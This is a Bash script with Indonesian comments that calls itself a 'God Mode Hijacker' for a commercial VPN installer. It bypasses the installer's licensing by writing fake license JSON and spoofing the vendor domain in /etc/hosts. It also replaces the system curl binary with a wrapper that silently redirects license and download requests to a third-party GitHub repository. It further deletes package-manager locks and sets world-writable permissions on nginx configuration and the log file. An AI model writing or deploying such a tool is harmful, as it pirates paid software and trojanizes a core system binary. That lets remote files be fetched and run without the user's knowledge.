#!/bin/bash

# ==========================================
# POTATONC GOD MODE HIJACKER V5 (CUSTOM PORTS)
# Fitur: Apache Port 8555, Nginx Port 81, Curl Wrapper V3
# ==========================================

# --- KONFIGURASI GLOBAL ---
DOMAIN="cloud.potatonc.com"
GITHUB_USER="ica4me"
GITHUB_REPO="vpn-script-tunneling"
GITHUB_BRANCH="main"
GITHUB_BASE="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}"
MY_IP="127.0.0.1"
LOG_FILE="/root/LOG_CURL_NEW.txt"

# --- KONFIGURASI PORT (Sesuai Request Anda) ---
APACHE_PORT=8555
NGINX_PORT=81

# Warna
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

# ==========================================
# 1. INISIALISASI & PEMBERSIHAN
# ==========================================
clear
echo -e "${GREEN}[*] MEMULAI GOD MODE V5 (CUSTOM PORTS)...${NC}"
echo -e "${GREEN}[*] TARGET: Nginx=$NGINX_PORT | Apache=$APACHE_PORT${NC}"

# Cek Root
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}[!] Harap jalankan script ini sebagai root!${NC}"
    exit 1
fi

# Reset Hosts File
sed -i "/$DOMAIN/d" /etc/hosts

# Kembalikan Curl Asli (Safety)
if [ -f /usr/bin/curl_asli ]; then
    rm -f /usr/bin/curl
    mv /usr/bin/curl_asli /usr/bin/curl
fi

# Fix apt & dpkg locks
rm -rf /var/lib/dpkg/lock*
rm -rf /var/lib/apt/lists/lock
dpkg --configure -a

# ==========================================
# 2. INSTALL DEPENDENCIES & WEB SERVERS
# ==========================================
echo -e "${YELLOW}[*] Menyiapkan Repository & Menginstall Paket...${NC}"

apt-get update -y
apt-get install -y gnupg2 ca-certificates lsb-release ubuntu-keyring curl zip unzip

# --- Install Nginx Repo Resmi ---
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    CODENAME=$VERSION_CODENAME
fi

echo -e "${YELLOW}[*] Menambahkan Nginx Repository...${NC}"
curl -s https://nginx.org/keys/nginx_signing.key | gpg --dearmor | tee /usr/share/keyrings/nginx-archive-keyring.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/nginx-archive-keyring.gpg] http://nginx.org/packages/mainline/${OS}/ ${CODENAME} nginx" | tee /etc/apt/sources.list.d/nginx.list

apt-get update -y
apt-get install -y nginx apache2

# ==========================================
# 3. SETTING PORT APACHE & NGINX (INTI PERUBAHAN)
# ==========================================
echo -e "${YELLOW}[*] Configuring Ports (Apache -> $APACHE_PORT, Nginx -> $NGINX_PORT)...${NC}"

# Stop Service Dulu
systemctl stop nginx apache2

# --- A. CONFIG APACHE2 KE PORT 8555 ---
# Fix folder structure untuk mencegah error dpkg
mkdir -p /etc/apache2/conf-available
mkdir -p /etc/apache2/sites-available
mkdir -p /etc/apache2/sites-enabled
touch /etc/apache2/apache2.conf
touch /etc/apache2/envvars
touch /etc/apache2/ports.conf

# Paksa Ganti Port di ports.conf (Hapus setting lama, buat baru)
echo "Listen $APACHE_PORT" > /etc/apache2/ports.conf
echo "<IfModule ssl_module>" >> /etc/apache2/ports.conf
echo "    Listen 443" >> /etc/apache2/ports.conf
echo "</IfModule>" >> /etc/apache2/ports.conf
echo "<IfModule mod_gnutls.c>" >> /etc/apache2/ports.conf
echo "    Listen 443" >> /etc/apache2/ports.conf
echo "</IfModule>" >> /etc/apache2/ports.conf

# Update VirtualHost Default Apache
sed -i "s/Listen 80/Listen $APACHE_PORT/g" /etc/apache2/ports.conf 2>/dev/null
sed -i "s/:80/:$APACHE_PORT/g" /etc/apache2/sites-available/*.conf
sed -i "s/:8080/:$APACHE_PORT/g" /etc/apache2/sites-available/*.conf

# --- B. CONFIG NGINX KE PORT 81 ---
mkdir -p /etc/nginx/conf.d
chmod 777 /etc/nginx/conf.d

# Buat nginx.conf Utama
cat > /etc/nginx/nginx.conf <<EOF
user  nginx;
worker_processes  auto;
error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;
events {
    worker_connections  1024;
}
http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    log_format  main  '\$remote_addr - \$remote_user [\$time_local] "\$request" '
                      '\$status \$body_bytes_sent "\$http_referer" '
                      '"\$http_user_agent" "\$http_x_forwarded_for"';
    access_log  /var/log/nginx/access.log  main;
    sendfile        on;
    keepalive_timeout  65;
    
    # Include conf.d agar script installer bisa masuk
    include /etc/nginx/conf.d/*.conf;
}
EOF

# Buat Default Config Nginx jalan di Port 81
# Ini penting agar Nginx bisa start "Active" sebelum ditimpa installer
cat > /etc/nginx/conf.d/default.conf <<EOF
server {
    listen       $NGINX_PORT;
    server_name  localhost;

    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    }

    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }
}
EOF

# Restart Service dengan Port Baru
systemctl restart apache2
systemctl restart nginx

# ==========================================
# 4. DATA LISENSI PALSU (MOCKING)
# ==========================================
echo -e "${YELLOW}[*] Membuat Data Bypass...${NC}"
mkdir -p /etc/hijack_data

cat > /etc/hijack_data/auth.json <<EOF
{"statusCode":200,"status":"true","data":{"name_client":"Admin God Mode","chat_id":"123456","address":"$MY_IP","domain":"$DOMAIN","key_client":"potatopremium","x_api_client":"bypass-key","type_script":"premium","pemilik_client":"God","status":"active","script":"none","date_exp":"2099-12-31","limit_ip":"999"}}
EOF

echo "latest" > /etc/hijack_data/version.txt
echo '{"status":"active","key":"potatopremium"}' > /etc/hijack_data/secure.json

# ==========================================
# 5. DNS SPOOFING
# ==========================================
echo "$MY_IP $DOMAIN" >> /etc/hosts

# ==========================================
# 6. CURL WRAPPER
# ==========================================
echo -e "${YELLOW}[*] Memasang Curl Wrapper...${NC}"

mv /usr/bin/curl /usr/bin/curl_asli

cat > /usr/bin/curl <<EOF
#!/bin/bash

LOG_FILE="$LOG_FILE"
TARGET_DOMAIN="$DOMAIN"
GITHUB_BASE="$GITHUB_BASE"
ARGS=("\$@")
NEW_ARGS=()

for ((i=0; i<\${#ARGS[@]}; i++)); do
    arg="\${ARGS[\$i]}"

    if [[ "\$arg" == "-o" ]]; then
        NEW_ARGS+=("\$arg")
        continue
    fi
    
    if [[ "\$arg" == *"-w"* ]] || [[ "\$arg" == *"http_code"* ]]; then
        NEW_ARGS+=("\$arg")
        continue
    fi

    if [[ "\$arg" == *"\$TARGET_DOMAIN"* ]]; then
        # LOGIC REDIRECT
        if [[ "\$arg" == *"/v2/newspall/"* ]]; then
            REDIRECT_URL="\${GITHUB_BASE}/auth/newspall"
        elif [[ "\$arg" == *"/v2/info/"* ]]; then
            REDIRECT_URL="\${GITHUB_BASE}/auth/info"
        elif [[ "\$arg" == *"/v2/getversion"* ]]; then
            REDIRECT_URL="\${GITHUB_BASE}/auth/getversion"
        elif [[ "\$arg" == *"/v2/secure/getkeyandauth"* ]]; then
            REDIRECT_URL="\${GITHUB_BASE}/auth/getkeyandauth"
        elif [[ "\$arg" == *"/v2/download/"* ]]; then
            FILENAME=\$(basename "\$arg")
            if [[ "\$FILENAME" == "nginxdefault.conf" ]]; then
                REDIRECT_URL="\${GITHUB_BASE}/nginxdefault.conf" 
            else
                REDIRECT_URL="\${GITHUB_BASE}/\${FILENAME}"
            fi
        else
            REDIRECT_URL="\$arg"
        fi
        
        NEW_ARGS+=("\$REDIRECT_URL")
        echo "[HIJACK] \$arg -> \$REDIRECT_URL" >> "\$LOG_FILE"
    else
        NEW_ARGS+=("\$arg")
    fi
done

/usr/bin/curl_asli "\${NEW_ARGS[@]}"
exit \$?
EOF

chmod +x /usr/bin/curl
touch $LOG_FILE
chmod 777 $LOG_FILE

# ==========================================
# 7. SELESAI
# ==========================================
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}   GOD MODE INSTALLED (CUSTOM PORTS READY)   ${NC}"
echo -e "${GREEN}=============================================${NC}"
echo -e "Status:"
echo -e "1. Apache2 Port    : $APACHE_PORT (Fixed)"
echo -e "2. Nginx Port      : $NGINX_PORT (Default)"
echo -e "3. Nginx Version   : $(nginx -v 2>&1 | grep -o '[0-9.]*')"
echo -e "4. URL Redirects   : AKTIF"
echo -e ""
echo -e "${YELLOW}System sudah diset ke port $APACHE_PORT dan $NGINX_PORT.${NC}"
echo -e "${YELLOW}Silakan jalankan script installer VPN Anda sekarang.${NC}"